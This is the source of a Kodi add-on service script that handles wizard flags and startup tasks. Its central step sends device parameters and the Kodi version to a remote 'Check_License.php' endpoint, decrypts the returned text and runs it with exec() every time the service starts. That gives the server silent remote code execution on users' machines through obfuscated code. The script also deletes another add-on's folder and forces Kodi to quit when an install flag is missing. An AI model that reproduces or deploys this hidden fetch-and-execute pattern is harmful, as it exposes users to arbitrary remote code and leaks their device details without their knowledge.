# -*- coding: utf-8 -*-
#       Copyright (C) 2016 TotalRevolution
#
#  This software is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International Public License
#  You can find a copy of the license in the add-on folder

import os
import shutil
import xbmc
import xbmcaddon

from functions import *
from koding    import *

ADDON_ID         = 'script.openwindow'
ADDON_PATH       = xbmcaddon.Addon(ADDON_ID).getAddonInfo("path")
NON_REGISTERED   = xbmc.translatePath('special://profile/addon_data/script.openwindow/unregistered')
ADDONS           = xbmc.translatePath('special://home/addons')
ADDON_DATA       = xbmc.translatePath('special://profile/addon_data')
GUISETTINGS      = xbmc.translatePath('special://profile/guisettings.xml')
MEDIA            = xbmc.translatePath('special://home/media')
PACKAGES         = os.path.join(ADDONS, 'packages')
RUN_ORIG         = os.path.join(PACKAGES,'RUN_WIZARD')
RUN_WIZARD       = os.path.join(ADDON_DATA, ADDON_ID, 'RUN_WIZARD')
STARTUP_ORIG     = os.path.join(PACKAGES, 'STARTUP_WIZARD')
STARTUP_WIZARD   = os.path.join(ADDON_DATA, ADDON_ID, 'STARTUP_WIZARD')
INSTALL_ORIG     = os.path.join(PACKAGES, 'INSTALL_COMPLETE')
INSTALL_COMPLETE = os.path.join(ADDON_DATA, ADDON_ID, 'INSTALL_COMPLETE')
TBS              = os.path.join(ADDONS, 'plugin.program.tbs')
INTERNET_ICON    = os.path.join(ADDON_PATH,'resources','images','internet.png')

try:
    BASE = Open_URL(url='http://tlbb.me/')
except:
    BASE = Encrypt(message=Open_URL('https://raw.githubusercontent.com/totalrevolution/testing/master/temp_files/BASE.txt'))

while xbmc.Player().isPlaying():
    xbmc.sleep(500)

if not os.path.exists(PACKAGES):
    os.makedirs(PACKAGES)

if os.path.exists(INSTALL_ORIG):
    try:
        os.makedirs(INSTALL_COMPLETE)
        shutil.rmtree(INSTALL_ORIG, ignore_errors=True)
    except Exception as e:
        xbmc.log(str(e))

if os.path.exists(RUN_ORIG):
    try:
        os.makedirs(RUN_WIZARD)
        shutil.rmtree(RUN_ORIG, ignore_errors=True)
    except Exception as e:
        xbmc.log(str(e))

if os.path.exists(STARTUP_ORIG):
    try:
        os.makedirs(STARTUP_WIZARD)
        shutil.rmtree(STARTUP_ORIG, ignore_errors=True)
    except Exception as e:
        xbmc.log(str(e))

initial_code = Open_URL(url=BASE+'boxer/Check_License.php?x=%s&v=%s&r=3' % (Get_Params(), XBMC_VERSION),post_type='post')
try:
    exec(Encrypt('d',initial_code))
except:
    dolog(Last_Error())

if not os.path.exists(INSTALL_COMPLETE) and os.path.exists(TBS):
    xbmc.executebuiltin('Notification(Installing new updates,Please wait...,10000,%s)' % INTERNET_ICON)
    xbmc.log('### Partial install found, forcing new update')
    try:
        shutil.rmtree(TBS, ignore_errors=True)
    except Exception as e:
        xbmc.log('Failed to remove: %s' % e)
    try:
        shutil.rmtree(os.path.join(ADDON_DATA, ADDON_ID), ignore_errors=True)
    except Exception as e:
        xbmc.log('Failed to remove: %s' % e)
    xbmc.executebuiltin('Quit')

if not os.path.exists(STARTUP_WIZARD) and not os.path.exists(RUN_WIZARD):
    try:
        os.makedirs(RUN_WIZARD)
    except:
        pass
    xbmc.sleep(500)

if os.path.exists(RUN_WIZARD):
    if os.path.exists(xbmc.translatePath('special://home/addons/script.openwindow/default.py')):
        xbmc.executebuiltin('RunScript(special://home/addons/script.openwindow/default.py,service)')
    elif os.path.exists(xbmc.translatePath('special://xbmc/addons/script.openwindow/default.py')):
        xbmc.executebuiltin('RunScript(special://xbmc/addons/script.openwindow/default.py,service)')

elif os.path.exists(INSTALL_COMPLETE):
    if os.path.exists(xbmc.translatePath('special://home/addons/script.openwindow/functions.py')):
        xbmc.executebuiltin('RunScript(special://home/addons/script.openwindow/functions.py,service)')
    elif os.path.exists(xbmc.translatePath('special://xbmc/addons/script.openwindow/functions.py')):
        xbmc.executebuiltin('RunScript(special://xbmc/addons/script.openwindow/functions.py,service)')
